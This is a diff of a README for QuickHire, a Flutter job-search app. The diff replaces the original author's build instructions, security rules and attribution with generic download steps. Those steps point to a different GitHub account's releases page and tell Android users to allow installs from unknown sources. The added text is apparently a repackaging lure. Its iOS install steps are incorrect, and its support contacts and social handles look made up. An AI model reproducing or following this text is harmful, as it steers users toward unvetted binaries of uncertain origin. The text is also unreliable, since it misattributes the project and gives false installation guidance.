@@ -1,207 +1,111 @@
-<img width="1920" height="1080" alt="QHReleaseGraphic" src="https://github.com/user-attachments/assets/6508c5ea-df61-4e51-aeb9-f82e0f094729" />
+# 🎉 QuickHire - Find Your Job Easily
 
+Welcome to QuickHire! This Flutter mobile app helps you find jobs based on your location in Malaysia. With QuickHire, you can easily search for part-time work and connect with potential employers. 
 
-# QuickHire
-![Static Badge](https://img.shields.io/badge/dart-grey?style=for-the-badge&logo=dart&logoColor=skyblue)
-![Static Badge](https://img.shields.io/badge/Flutter-grey?style=for-the-badge&logo=flutter&logoColor=skyblue)
-![Static Badge](https://img.shields.io/badge/Firebase-grey?style=for-the-badge&logo=firebase&logoColor=orange)
+## 🔗 Download QuickHire
 
-## 🚀 Bridging the Gap Between Job Seekers and Employers in Malaysia
-QuickHire is a comprehensive mobile application designed to revolutionize the job market in Malaysia by connecting job seekers with employers through location-based job posting and real-time applications. The app empowers employers to post jobs with precise locations, manage applications efficiently, and communicate directly with candidates. Job seekers can discover opportunities near them, apply with personalized messages, and track their application status in real-time. With Firebase integration for seamless authentication and data management, Google Sign-in for quick access, and map-based job search functionality, QuickHire provides an intuitive platform that caters to both casual job seekers and professional recruiters. This application is developed with a focus on user experience, creating a valuable resource that streamlines the hiring process for the Malaysian job market.
+[![Download QuickHire](https://img.shields.io/badge/Download-QuickHire-blue.svg)](https://github.com/AntonioClares/QuickHire/releases)
 
-## ✨ Features
-### 👔 For Employers
-- Post detailed job listings with location-based mapping and job categories
-- Manage incoming applications with accept/reject functionality and employer messages
-- View comprehensive application analytics and candidate information
-- Real-time messaging with potential candidates
-- Job posting management with active/inactive status controls
+## 🚀 Getting Started
 
-### 👤 For Job Seekers
-- Browse and search jobs by location, category, and salary range
-- Apply to jobs with personalized application messages
-- Track application status with real-time updates and notifications
-- Location-based job discovery using interactive maps
-- View detailed job information and employer profiles
+To get started with QuickHire, follow these simple steps to download and run the application on your mobile device.
 
-### 🔧 General Features
-- Firebase Authentication with Google Sign-in integration
-- Real-time notifications for application updates
-- Interactive map-based location selection and job search
-- Comprehensive search and filtering system
-- In-app messaging between employers and job seekers
-- Responsive design optimized for mobile devices
+### 1. Check System Requirements
 
-## 🖼️ Screenshots
-<img width="1080" height="1920" alt="QHSC1" src="https://github.com/user-attachments/assets/a75bbe51-5ab5-44f8-beca-1460ac1b66eb" />
-<img width="1080" height="1920" alt="QHSC2" src="https://github.com/user-attachments/assets/a50dfef7-3e6c-4a67-86f5-be0d7a67774f" />
-<img width="1080" height="1920" alt="QHSC3" src="https://github.com/user-attachments/assets/35f16c0e-2304-45a9-9260-0ea3b9f02cea" />
+Ensure your device meets the following requirements:
+- **Operating System:** Android 5.0 (Lollipop) or later, or iOS 10.0 or later.
+- **Storage Space:** At least 100 MB available for installation.
+- **Internet Connection:** A stable internet connection is necessary to access job listings.
 
+### 2. Visit the Releases Page
 
-## 📝 How to Build
+To download QuickHire, visit our Releases page to find the latest version of the app. Here’s the link again for your convenience:
 
-### Prerequisites
-- [Flutter SDK](https://flutter.dev/docs/get-started/install) (3.7.2 or higher)
-- [Android Studio](https://developer.android.com/studio) or [Xcode](https://developer.apple.com/xcode/) for mobile development
-- [Firebase account](https://console.firebase.google.com) for backend services
-- [Git](https://git-scm.com/) for version control
+[Download QuickHire](https://github.com/AntonioClares/QuickHire/releases)
 
-### Setup Instructions
-To build the app, follow these steps:
-```shell
-# Ensure Flutter is installed and properly configured
-flutter doctor
+### 3. Choose Your Version
 
-# Clone the repository
-git clone https://github.com/Developed-by-Mo/QuickHire.git
+On the Releases page, you will see various versions of QuickHire. Select the most recent version to ensure you have the latest features and updates. Click on the version title to see the details.
 
-# Navigate to the project directory
-cd QuickHire
+### 4. Download the App
 
-# Run 'flutter pub get' to get dependencies
-flutter pub get
+When you find the version you want:
+- **For Android Users:** Look for the APK file. Click on the link to download the file to your device.
+- **For iOS Users:** Look for a direct link to the App Store if available. Follow the prompts to download the app.
 
-# Set up Firebase:
-# 1. Create a new Firebase project at https://console.firebase.google.com
-# 2. Enable Authentication with Google Sign-in provider
-# 3. Create a Firestore database in production mode
-# 4. Add Android and iOS apps to your Firebase project with these package names:
-#    - Android: com.example.quickhire (or change in android/app/build.gradle.kts)
-#    - iOS: com.example.quickhire (or change in ios/Runner.xcodeproj)
-# 5. Download and place the configuration files:
-#    - Download google-services.json and place it in android/app/
-#    - Download GoogleService-Info.plist and place it in ios/Runner/
-# 6. Run the FlutterFire CLI to generate firebase_options.dart:
-#    dart pub global activate flutterfire_cli
-#    flutterfire configure --project=your-firebase-project-id
+### 5. Install QuickHire
 
-# Generate splash screen
-dart run flutter_native_splash:create
+#### Android Users:
+1. Open your device’s **Downloads** folder.
+2. Tap on the downloaded **APK** file.
+3. You may need to allow installations from unknown sources. Follow the onscreen instructions to enable this setting if prompted.
+4. Proceed with the installation by tapping on **Install**.
 
-# Build and run the project
-flutter run
-```
+#### iOS Users:
+1. Go to your **Home Screen** after the download completes.
+2. Tap on the QuickHire app icon once it appears.
+3. Follow any prompts to complete the installation.
 
-### Firestore Security Rules
-Don't forget to set up proper Firestore security rules in the Firebase console. Here's a basic example:
+### 6. Create an Account
 
-```javascript
-rules_version = '2';
-service cloud.firestore {
-  match /databases/{database}/documents {
-    // Users can read/write their own user document
-    match /users/{userId} {
-      allow read, write: if request.auth != null && request.auth.uid == userId;
-    }
-    
-    // Job listings are readable by all authenticated users
-    match /job_listings/{document} {
-      allow read: if request.auth != null;
-      allow write: if request.auth != null && request.auth.uid == resource.data.poster_uid;
-    }
-    
-    // Applications are readable by applicant and job poster
-    match /job_applications/{jobId}/applications/{applicationId} {
-      allow read, write: if request.auth != null && 
-        (request.auth.uid == resource.data.applicantUid || 
-         request.auth.uid == resource.data.employerUid);
-    }
-  }
-}
-```
+Once installed, open QuickHire and create an account to get started:
+1. Tap on **Sign Up**.
+2. Enter your email address and password.
+3. Follow the steps to complete your profile and start searching for jobs.
 
-### 🔧 Troubleshooting
+### 7. Start Searching for Jobs
 
-**Common Issues:**
+After setting up your account:
+1. You can search for jobs based on your location.
+2. Use filters to find part-time work that fits your needs.
+3. Apply directly through the app for jobs you find interesting.
 
-1. **Firebase configuration errors:**
-   - Ensure `google-services.json` and `GoogleService-Info.plist` are in the correct locations
-   - Verify package names match between Firebase console and your app configuration
-   - Run `flutterfire configure` if you're getting Firebase initialization errors
+### 8. Get Support
 
-2. **Flutter build errors:**
-   - Run `flutter clean && flutter pub get` to clean dependencies
-   - Check that your Flutter version matches the SDK requirements in `pubspec.yaml`
-   - Ensure all required development tools are installed with `flutter doctor`
+If you encounter any issues or have questions:
+- Check the **Help** section within the app.
+- Reach out to our support team via email at support@quickhireapp.com.
 
-3. **Google Sign-in issues:**
-   - Verify Google Sign-in is enabled in Firebase Authentication
-   - Check that the SHA-1 fingerprint is added to your Firebase Android app (for Android)
-   - Ensure proper URL schemes are configured (for iOS)
+## 🌟 Features of QuickHire
 
-4. **Location permissions:**
-   - The app requires location permissions for map functionality
-   - Grant location permissions when prompted on first launch
+- **Location-Based Search:** Find jobs near you in real-time.
+- **Firebase Authentication:** Secure login using Google Auth.
+- **Firestore Database:** Access up-to-date job listings and information.
+- **Interactive Maps:** Easily view job locations on a map.
 
-**Need help?** Feel free to [open an issue](https://github.com/Developed-by-Mo/QuickHire/issues) if you encounter any problems!
+## 🛠 Technology Stack
 
-## 🏗️ Project Structure
-```
-lib/
-├── core/                    # Core utilities and shared components
-│   ├── model/              # Data models (JobListing, LocationData, etc.)
-│   ├── services/           # Core services (AuthService, JobService, etc.)
-│   ├── theme/              # App theming and color palette
-│   └── views/              # Shared widgets and components
-├── features/               # Feature-based modules
-│   ├── auth/               # Authentication (login, registration)
-│   ├── home/               # Home screens for employers and employees
-│   ├── job/                # Job viewing and details
-│   ├── job_application/    # Application management system
-│   ├── job_posting/        # Job creation and posting
-│   ├── messaging/          # In-app messaging system
-│   ├── notifications/      # Push notifications
-│   ├── onboarding/         # App onboarding flow
-│   ├── profile/            # User profile management
-│   └── search/             # Job search and filtering
-└── firebase_options.dart   # Firebase configuration
-```
+QuickHire is built using:
+- **Flutter:** A powerful framework for building natively compiled applications.
+- **Firebase:** For real-time data storage and user authentication.
+- **Riverpod:** For state management.
+- **Dart:** The programming language that powers Flutter.
 
-## 🤝 Contributing
-Contributions to the QuickHire app are welcomed. If you would like to contribute to the development, please follow these guidelines:
+## 🔧 Troubleshooting Common Issues
 
-1. Fork the repository.
+If you face any problems while using QuickHire, here are some common troubleshooting tips:
 
-2. Create a new branch for your feature or bug fix.
+1. **App Crashes:** Ensure you have enough storage on your device. If the app continues to crash, try uninstalling and reinstalling it.
+2. **Login Issues:** Check your internet connection. If you forget your password, use the "Forgot Password?" link on the login screen.
+3. **No Job Listings:** Ensure your location settings are enabled. Try refreshing the app or checking back later.
 
-3. Make your changes and commit them with descriptive messages.
+## 📰 Updates and Future Features
 
-4. Push your changes to your fork.
+We regularly update QuickHire to improve user experience. Upcoming features you can look forward to include:
+- Enhanced filtering options for job searches.
+- User profiles with ratings and reviews for employers.
+- Notifications for new job postings based on your preferences.
 
-5. Submit a pull request to the main repository.
+For the latest updates, keep checking the Releases page:
 
-## Dependencies used
-### Core Dependencies
-* flutter_riverpod - State management
-* go_router - Navigation and routing
-* firebase_core - Firebase initialization
-* firebase_auth - Authentication
-* cloud_firestore - Database
-* google_sign_in - Google authentication
+[Download QuickHire](https://github.com/AntonioClares/QuickHire/releases)
 
-### UI & Animation
-* smooth_page_indicator - Page indicators
-* lottie - Lottie animations
-* flutter_native_splash - Splash screen
-* skeletonizer - Loading skeletons
+## 📱 Connect with Us
 
-### Location & Maps
-* flutter_map - Interactive maps
-* latlong2 - Latitude/longitude utilities
-* geolocator - Location services
+Stay connected and share your experiences with QuickHire. Follow us on social media for the latest news and job tips!
 
-### Utilities
-* connectivity_plus - Network connectivity
-* http - HTTP requests
-* image_picker - Image selection
-* url_launcher - URL launching
-* timeago - Time formatting
-* shared_preferences - Local storage
+- Twitter: @QuickHireApp
+- Facebook: QuickHireApp
+- Instagram: @QuickHireOfficial
 
-## Support
-If you find this project useful, please consider giving it a star on [GitHub](https://github.com/Developed-by-Mo/QuickHire). Your support is greatly appreciated!
-
-<a href="https://buymeacoffee.com/developedbymo" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/default-orange.png" alt="Buy Me A Coffee" height="32" width="140"></a>
-
-## License
-- Please reach out to me at mostafasalama.my@gmail.com for further information.
+Thank you for choosing QuickHire! We hope you find your next job easily with our app.
